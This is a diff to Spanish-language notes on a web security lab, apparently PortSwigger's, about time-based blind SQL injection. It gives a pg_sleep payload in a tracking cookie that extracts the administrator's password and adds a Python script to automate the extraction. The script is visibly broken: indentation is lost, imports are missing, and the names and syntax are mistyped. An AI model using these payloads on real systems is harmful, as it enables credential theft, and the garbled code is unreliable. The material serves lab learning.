@@ -158,7 +158,40 @@ Si queremos también buscar la longitud de la contraseña podemos usar la query 
 
 SI queremos identificar cada carácter de la contraseñas usamos `'%3b select case when(username="Administrator" and substring(password,1,1)='a') then pg_sleep(5) else pg_sleep(0) end from users-- -`, con lo que lo que buscamos que el primer carácter si es una `a` tarde cinco segundos en responder. Y así se podría proceder con todos los caracteres de la contraseña.
 
+Tambien lo podemos automatizar de la siguiente forma
+```python
+import signal
+import sys
+import string
 
+def def_handler(sig, frame):
+    print(colored(f"\n[!] Saliendo...\n", "red"))
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+characters = string.ascii_lowercase + string.digits
+
+def makeSQLI():
+    for position in range(1, 21):
+    for character in characters:
+    cookies = {
+    'TrackingId': f"test%3b select case when(username='administrator' and substring(password,{position}),1)='{character}') then pg_sleep(3) else pg_sleep(0) end from users__",
+    'session': "Likdyr1YeNj01gP3QJCEYLboh2e6q4GM"
+    }
+
+    time_start = time.time()
+
+    r = requests.get("https://0aa100ed04832e02817c438800da0056.web-security-academy.net", cookies=cookies)
+
+    time_end = time.time()
+
+    if time_end - time_start > 3:
+    print(charact)
+    if __name__ == '__main__':
+    makeSQLI()
+```
 
 
 
